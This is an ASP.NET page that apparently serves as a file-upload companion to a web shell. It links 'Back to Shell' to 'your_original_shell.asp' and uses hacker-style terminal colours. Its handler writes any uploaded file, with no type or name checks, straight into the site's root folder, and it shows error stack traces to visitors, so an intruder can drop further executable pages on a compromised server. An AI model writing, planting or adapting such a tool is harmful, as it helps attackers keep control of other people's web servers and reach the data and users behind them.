<%@ Page Language="C#" Debug="true" %>
<html>
<head>
    <title>Working Uploader</title>
    <style>
        body {font-family:monospace; background:#111; color:#0f0; padding:30px;}
        pre {background:#222; padding:15px; color:yellow;}
    </style>
</head>
<body>
    <h2>ASP.NET File Uploader (Working)</h2>
    
    <form id="form1" method="post" enctype="multipart/form-data" runat="server">
        <asp:FileUpload ID="FileUpload1" runat="server" />
        <asp:Button ID="btnUpload" runat="server" Text="Upload File" OnClick="btnUpload_Click" />
        <br><br>
        <asp:Label ID="lblStatus" runat="server" ForeColor="Yellow" Font-Bold="true"></asp:Label>
    </form>

    <script runat="server">
        protected void btnUpload_Click(object sender, EventArgs e)
        {
            if (FileUpload1.HasFile)
            {
                try
                {
                    string fileName = System.IO.Path.GetFileName(FileUpload1.FileName);
                    string savePath = Server.MapPath("~/") + fileName;   // current folder

                    FileUpload1.SaveAs(savePath);
                    lblStatus.Text = "✅ Upload Successful!<br>File: " + fileName;
                }
                catch (Exception ex)
                {
                    lblStatus.Text = "❌ Error: " + ex.Message + "<br><br>Stack: " + ex.StackTrace;
                }
            }
            else
            {
                lblStatus.Text = "Please select a file first.";
            }
        }
    </script>

    <hr>
    <a href="your_original_shell.asp">← Back to Shell</a>
</body>
</html>
